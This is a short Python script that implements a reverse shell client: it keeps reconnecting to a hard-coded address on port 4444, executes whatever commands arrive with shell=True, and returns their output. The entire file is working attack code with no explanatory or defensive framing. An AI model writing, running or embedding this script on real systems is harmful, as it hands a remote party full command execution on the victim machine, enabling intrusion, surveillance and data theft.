import socket
import time
import subprocess
import os

SERVER_HOST = "192.168.252.205"  
SERVER_PORT = 4444

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            return s
        except Exception as e:
            print(f"Connection failed: {e}")
            time.sleep(30)

def send_data(s, data):
    try:
        s.send(data.encode())
    except Exception as e:
        print(f"Sending failed: {e}")

def receive_data(s):
    try:
        return s.recv(4096).decode()
    except Exception as e:
        print(f"Receiving failed: {e}")
        return None
        
        
     
def execute_command(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if process.returncode == 0:
            if output:
                return output.decode()
            else:
                return "Command executed successfully but no output generated."
        else:
            return error.decode()
    except Exception as e:
        return str(e)


def main():
    server_socket = connect_to_server()
    print("Connected to the server.")

    while True:
        command = receive_data(server_socket)

        if command.strip().lower() == "exit":
            break
        result = execute_command(command)
        send_data(server_socket, result)

    server_socket.close()

if __name__ == "__main__":
    main()
